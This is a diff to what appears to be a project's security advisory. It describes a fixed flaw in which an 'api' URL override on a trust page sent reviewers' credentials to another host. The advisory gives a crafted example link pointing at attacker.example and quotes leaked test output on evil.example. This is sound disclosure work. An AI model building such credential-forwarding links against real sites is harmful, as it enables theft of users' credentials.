@@ -140,8 +140,9 @@ Please follow responsible disclosure practices.
   crafted link `https://epilabs.org/t/<slug>?api=https://attacker.example` would
   forward the victim's reviewer credential to the attacker — and let the attacker
   serve arbitrary content back as the trust page. The site's
-  `Content-Security-Policy` is **Report-Only**, so nothing else stopped it. The
-  override is now honoured **only on a local host**; on any public hostname it is
+  `Content-Security-Policy` was **Report-Only** at the time, so nothing else
+  stopped it; the host guard below is the fix and does not depend on the policy.
+  The override is now honoured **only on a local host**; on any public hostname it is
   ignored. Pinned by `tests/test_trust_page_api_override.py`, which reproduces the
   leak against the old code (`['https://evil.example/v1/trust/sh_test']`).
 - **EPI Cloud: a machine API key could mint a whole-org trust link (red-team C-01).**
